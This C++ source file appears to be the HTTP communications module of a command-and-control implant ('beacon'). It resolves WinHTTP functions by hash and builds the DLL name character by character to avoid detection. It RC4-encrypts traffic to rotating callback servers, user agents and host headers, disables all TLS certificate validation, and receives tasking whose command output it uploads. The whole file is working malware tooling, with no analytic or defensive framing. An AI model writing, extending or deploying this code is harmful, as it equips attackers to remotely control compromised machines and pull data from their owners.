#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"


BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;

	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while (_isdigest(str[index])) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10)
			return (sign == 1) ? INT_MAX : INT_MIN;

		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}


// Inline ASCII->UTF-16 conversion. Allocates via LocalAlloc; caller frees.
// WinHTTP APIs take wide strings, but every string the beacon profile
// carries is 7-bit ASCII (methods, URIs, host headers, UAs, header
// blocks). A one-byte-per-char widening is correct and keeps the beacon
// free of a dependency on MultiByteToWideChar.
static WCHAR* AsciiToWide(HTTPFUNC* fn, const CHAR* src, ULONG* outLenChars)
{
	if (!src) {
		if (outLenChars) *outLenChars = 0;
		return NULL;
	}
	ULONG srcLen = 0;
	while (src[srcLen]) srcLen++;
	WCHAR* dst = (WCHAR*)fn->LocalAlloc(LPTR, (srcLen + 1) * sizeof(WCHAR));
	if (!dst) {
		if (outLenChars) *outLenChars = 0;
		return NULL;
	}
	for (ULONG i = 0; i < srcLen; i++) {
		dst[i] = (WCHAR)(unsigned char)src[i];
	}
	dst[srcLen] = 0;
	if (outLenChars) *outLenChars = srcLen;
	return dst;
}


void* ConnectorHTTP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorHTTP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorHTTP));
}

ConnectorHTTP::ConnectorHTTP()
{
	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;

	CHAR winhttp_c[12];
	winhttp_c[0]  = HdChrA('w');
	winhttp_c[1]  = HdChrA('i');
	winhttp_c[2]  = HdChrA('n');
	winhttp_c[3]  = HdChrA('h');
	winhttp_c[4]  = HdChrA('t');
	winhttp_c[5]  = HdChrA('t');
	winhttp_c[6]  = HdChrA('p');
	winhttp_c[7]  = HdChrA('.');
	winhttp_c[8]  = HdChrA('d');
	winhttp_c[9]  = HdChrA('l');
	winhttp_c[10] = HdChrA('l');
	winhttp_c[11] = HdChrA(0);

	HMODULE hWinhttpModule = this->functions->LoadLibraryA(winhttp_c);
	if (hWinhttpModule) {
		this->functions->WinHttpOpen               = (decltype(WinHttpOpen)*)               GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPOPEN);
		this->functions->WinHttpConnect            = (decltype(WinHttpConnect)*)            GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPCONNECT);
		this->functions->WinHttpOpenRequest        = (decltype(WinHttpOpenRequest)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPOPENREQUEST);
		this->functions->WinHttpAddRequestHeaders  = (decltype(WinHttpAddRequestHeaders)*)  GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
		this->functions->WinHttpSendRequest        = (decltype(WinHttpSendRequest)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPSENDREQUEST);
		this->functions->WinHttpWriteData          = (decltype(WinHttpWriteData)*)          GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPWRITEDATA);
		this->functions->WinHttpReceiveResponse    = (decltype(WinHttpReceiveResponse)*)    GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPRECEIVERESPONSE);
		this->functions->WinHttpQueryHeaders       = (decltype(WinHttpQueryHeaders)*)       GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPQUERYHEADERS);
		this->functions->WinHttpQueryDataAvailable = (decltype(WinHttpQueryDataAvailable)*) GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
		this->functions->WinHttpReadData           = (decltype(WinHttpReadData)*)           GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPREADDATA);
		this->functions->WinHttpCloseHandle        = (decltype(WinHttpCloseHandle)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPCLOSEHANDLE);
		this->functions->WinHttpSetOption          = (decltype(WinHttpSetOption)*)          GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPSETOPTION);
		this->functions->WinHttpSetTimeouts        = (decltype(WinHttpSetTimeouts)*)        GetSymbolAddress(hWinhttpModule, HASH_FUNC_WINHTTPSETTIMEOUTS);
	}
}

BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
	LPSTR encBeat = b64_encode(beat, beatSize);

	ULONG enc_beat_length = StrLenA(encBeat);
	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);

	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	this->functions->LocalFree(encBeat);
	encBeat = NULL;

	this->headers        = HttpHeaders;
	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**)profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->http_method    = (CHAR*)profile.http_method;
	this->uri_count      = profile.uri_count;
	this->uris           = (CHAR**) profile.uris;
	this->ua_count       = profile.ua_count;
	this->user_agents    = (CHAR**) profile.user_agents;
	this->hh_count       = profile.hh_count;
	this->host_headers   = (CHAR**) profile.host_headers;
	this->rotation_mode  = profile.rotation_mode;
	this->ans_size       = profile.ans_size;
	this->ans_pre_size   = profile.ans_pre_size;

	this->proxy_type     = profile.proxy_type;
	this->proxy_username = (CHAR*)profile.proxy_username;
	this->proxy_password = (CHAR*)profile.proxy_password;

	// WinHTTP named-proxy format differs from WinINet: pass "host:port"
	// (no scheme prefix). WinHTTP picks CONNECT vs direct based on the
	// target URL's scheme, so a single named-proxy string works for
	// both HTTP and HTTPS targets.
	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
		WORD port = profile.proxy_port;
		CHAR portStr[6];
		int portIdx = 0;
		if (port == 0) {
			portStr[portIdx++] = '0';
		}
		else {
			CHAR temp[6];
			int tempIdx = 0;
			while (port > 0) {
				temp[tempIdx++] = '0' + (port % 10);
				port /= 10;
			}
			for (int i = tempIdx - 1; i >= 0; i--) {
				portStr[portIdx++] = temp[i];
			}
		}
		portStr[portIdx] = 0;

		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, hostLen + 1 + portIdx + 1);
		ULONG idx = 0;
		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
		idx += hostLen;
		this->proxy_url[idx++] = ':';
		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
	}

	return TRUE;
}

void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = 0;

	ULONG attempt = 0;
	BOOL  connected = FALSE;
	BOOL  result = FALSE;

	// Close existing handles to force new session/connect per call.
	// WinHTTP sessions carry per-session options (UA, proxy), and the
	// retry loop below may try a different server/UA; a fresh session
	// per SendData avoids stale option state.
	if (this->hConnect) {
		this->functions->WinHttpCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->WinHttpCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	while (!connected && attempt < this->server_count) {
		if (!this->hInternet) {
			CHAR* currentUA = this->user_agents[this->ua_index];
			ULONG uaLen = 0;
			WCHAR* uaW = AsciiToWide(this->functions, currentUA, &uaLen);

			if (this->proxy_url != NULL) {
				ULONG proxyLen = 0;
				WCHAR* proxyW = AsciiToWide(this->functions, this->proxy_url, &proxyLen);
				this->hInternet = this->functions->WinHttpOpen(
					uaW,
					WINHTTP_ACCESS_TYPE_NAMED_PROXY,
					proxyW,
					WINHTTP_NO_PROXY_BYPASS,
					0);
				if (proxyW) {
					memset(proxyW, 0, (proxyLen + 1) * sizeof(WCHAR));
					this->functions->LocalFree(proxyW);
				}
			}
			else {
				this->hInternet = this->functions->WinHttpOpen(
					uaW,
					WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
					WINHTTP_NO_PROXY_NAME,
					WINHTTP_NO_PROXY_BYPASS,
					0);
			}

			if (uaW) {
				memset(uaW, 0, (uaLen + 1) * sizeof(WCHAR));
				this->functions->LocalFree(uaW);
			}

			// Reasonable timeouts so a dead callback doesn't block the
			// agent loop forever: 10s resolve/connect, 30s send/receive.
			if (this->hInternet) {
				this->functions->WinHttpSetTimeouts(this->hInternet, 10000, 10000, 30000, 30000);
			}
		}

		if (this->hInternet) {
			if (!this->hConnect) {
				CHAR* currentHost = this->server_address[this->server_index];
				ULONG hostLen = 0;
				WCHAR* hostW = AsciiToWide(this->functions, currentHost, &hostLen);
				this->hConnect = this->functions->WinHttpConnect(
					this->hInternet,
					hostW,
					this->server_ports[this->server_index],
					0);
				if (hostW) {
					memset(hostW, 0, (hostLen + 1) * sizeof(WCHAR));
					this->functions->LocalFree(hostW);
				}
			}

			if (this->hConnect) {
				DWORD flags = WINHTTP_FLAG_REFRESH;
				if (this->ssl)
					flags |= WINHTTP_FLAG_SECURE;

				CHAR* currentUri = this->uris[this->uri_index];
				ULONG uriLen = 0, methodLen = 0;
				WCHAR* uriW    = AsciiToWide(this->functions, currentUri, &uriLen);
				CHAR*  effectiveMethod = (data && data_size > 0) ? (CHAR*)"POST" : this->http_method;
				WCHAR* methodW = AsciiToWide(this->functions, effectiveMethod, &methodLen);

				HINTERNET hRequest = this->functions->WinHttpOpenRequest(
					this->hConnect,
					methodW,
					uriW,
					NULL,
					WINHTTP_NO_REFERER,
					WINHTTP_DEFAULT_ACCEPT_TYPES,
					flags);

				if (methodW) {
					memset(methodW, 0, (methodLen + 1) * sizeof(WCHAR));
					this->functions->LocalFree(methodW);
				}
				if (uriW) {
					memset(uriW, 0, (uriLen + 1) * sizeof(WCHAR));
					this->functions->LocalFree(uriW);
				}

				if (hRequest) {
					if (this->ssl) {
						DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
							| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
							| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
							| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
						this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
					}

					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
						ULONG puLen = 0;
						WCHAR* puW = AsciiToWide(this->functions, this->proxy_username, &puLen);
						if (puW) {
							this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_USERNAME, puW, puLen * sizeof(WCHAR));
							memset(puW, 0, (puLen + 1) * sizeof(WCHAR));
							this->functions->LocalFree(puW);
						}
						if (this->proxy_password != NULL) {
							ULONG ppLen = 0;
							WCHAR* ppW = AsciiToWide(this->functions, this->proxy_password, &ppLen);
							if (ppW) {
								this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_PASSWORD, ppW, ppLen * sizeof(WCHAR));
								memset(ppW, 0, (ppLen + 1) * sizeof(WCHAR));
								this->functions->LocalFree(ppW);
							}
						}
					}

					// Build the additional-headers block. WinHTTP's
					// WinHttpSendRequest sets Content-Length automatically
					// for ANY method when a non-zero body length is passed,
					// which is why this connector no longer needs the
					// explicit Content-Length workaround that the WinINet
					// path required for GET-with-body.
					CHAR* reqHeaders = this->headers;
					CHAR* tmpHeaders = NULL;
					if (this->hh_count > 0) {
						CHAR* currentHH = this->host_headers[this->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = StrLenA(this->headers);
						WORD currentPort = this->server_ports[this->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
						ULONG off = 0;
						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
						if (needPort) {
							tmpHeaders[off++] = ':';
							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
						}
						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
						tmpHeaders[off] = 0;
						reqHeaders = tmpHeaders;
					}

					ULONG hdrLenChars = 0;
					WCHAR* hdrW = AsciiToWide(this->functions, reqHeaders, &hdrLenChars);

					connected = this->functions->WinHttpSendRequest(
						hRequest,
						hdrW,
						hdrLenChars,
						(LPVOID)data,
						data_size,
						data_size,
						0);

					if (hdrW) {
						memset(hdrW, 0, (hdrLenChars + 1) * sizeof(WCHAR));
						this->functions->LocalFree(hdrW);
					}
					if (tmpHeaders) {
						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
						this->functions->LocalFree(tmpHeaders);
					}

					if (connected) {
						connected = this->functions->WinHttpReceiveResponse(hRequest, NULL);
					}

					if (connected) {
						DWORD statusCode = 0;
						DWORD statusSize = sizeof(statusCode);
						result = this->functions->WinHttpQueryHeaders(
							hRequest,
							WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
							WINHTTP_HEADER_NAME_BY_INDEX,
							&statusCode,
							&statusSize,
							WINHTTP_NO_HEADER_INDEX);

						if (result && statusCode == 200) {
							// Try Content-Length first; fall back to
							// chunked read when the server omits it.
							DWORD answerSize = 0;
							DWORD contentLenSize = sizeof(answerSize);
							BOOL haveCL = this->functions->WinHttpQueryHeaders(
								hRequest,
								WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
								WINHTTP_HEADER_NAME_BY_INDEX,
								&answerSize,
								&contentLenSize,
								WINHTTP_NO_HEADER_INDEX);

							if (haveCL && answerSize > 0) {
								ULONG numberReadedBytes = 0;
								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);
								// Ask WinHttpReadData for the remaining Content-Length bytes each
								// iteration. The previous code gated the read on WinHttpQueryDataAvailable:
								// for a small response that raced the socket buffer, the pre-call
								// returned 0, the loop broke, and recvSize stayed 0 forever. The
								// server dutifully returns 47-59 byte task deliveries that the
								// beacon then never sees, so no command runs and no output is uploaded.
								// WinHttpReadData blocks for data to arrive; Content-Length is
								// authoritative.
								while (numberReadedBytes < answerSize) {
									DWORD toRead = answerSize - numberReadedBytes;
									DWORD readedBytes = 0;
									if (!this->functions->WinHttpReadData(hRequest, buffer + numberReadedBytes, toRead, &readedBytes) || readedBytes == 0) {
										break;
									}
									numberReadedBytes += readedBytes;
								}
								this->recvSize = numberReadedBytes;
								this->recvData = buffer;
							}
							else {
								// No Content-Length (chunked or
								// connection-closed framing): read until
								// WinHttpQueryDataAvailable reports 0 or
								// the socket closes.
								ULONG numberReadedBytes = 0;
								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
								while (1) {
									DWORD avail = 0;
									if (!this->functions->WinHttpQueryDataAvailable(hRequest, &avail) || avail == 0) {
										break;
									}
									buffer = (BYTE*)this->functions->LocalReAlloc(buffer, numberReadedBytes + avail, LMEM_MOVEABLE);
									DWORD readedBytes = 0;
									if (!this->functions->WinHttpReadData(hRequest, buffer + numberReadedBytes, avail, &readedBytes) || readedBytes == 0) {
										break;
									}
									numberReadedBytes += readedBytes;
								}
								if (numberReadedBytes) {
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
								else {
									this->functions->LocalFree(buffer);
								}
							}
						}
					}

					this->functions->WinHttpCloseHandle(hRequest);
				}
			}

			attempt++;
			if (!connected) {
				if (this->hConnect) {
					this->functions->WinHttpCloseHandle(this->hConnect);
					this->hConnect = NULL;
				}
				if (this->hInternet) {
					this->functions->WinHttpCloseHandle(this->hInternet);
					this->hInternet = NULL;
				}
				this->server_index = (this->server_index + 1) % this->server_count;
			}
		}
	}

	// Rotate indices for next callback (active round-robin) — once per
	// call, after the retry loop, so the failover increment above is not
	// undone.
	if (this->rotation_mode == 1) {
		this->uri_index = GenerateRandom32() % this->uri_count;
		this->ua_index = GenerateRandom32() % this->ua_count;
		this->server_index = GenerateRandom32() % this->server_count;
		if (this->hh_count > 0)
			this->hh_index = GenerateRandom32() % this->hh_count;
	}
	else {
		this->uri_index = (this->uri_index + 1) % this->uri_count;
		this->ua_index = (this->ua_index + 1) % this->ua_count;
		this->server_index = (this->server_index + 1) % this->server_count;
		if (this->hh_count > 0)
			this->hh_index = (this->hh_index + 1) % this->hh_count;
	}
}

BYTE* ConnectorHTTP::RecvData()
{
	if (this->recvData)
		return this->recvData + this->ans_pre_size;
	else
		return NULL;
}

int ConnectorHTTP::RecvSize()
{
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
}

void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize > 0) {
		EncryptRC4(plainData, plainSize, sessionKey, 16);
		this->SendData(plainData, plainSize);
	}
	else {
		this->SendData(NULL, 0);
	}

	if (this->recvSize > 0 && this->recvData) {
		int dataSize = this->RecvSize();
		BYTE* dataPtr = this->RecvData();
		if (dataSize > 0 && dataPtr)
			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
	}
}

void ConnectorHTTP::CloseConnector()
{
	DWORD l = StrLenA(this->headers);
	memset(this->headers, 0, l);
	this->functions->LocalFree(this->headers);
	this->headers = NULL;

	if (this->hConnect) {
		this->functions->WinHttpCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->WinHttpCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}
}
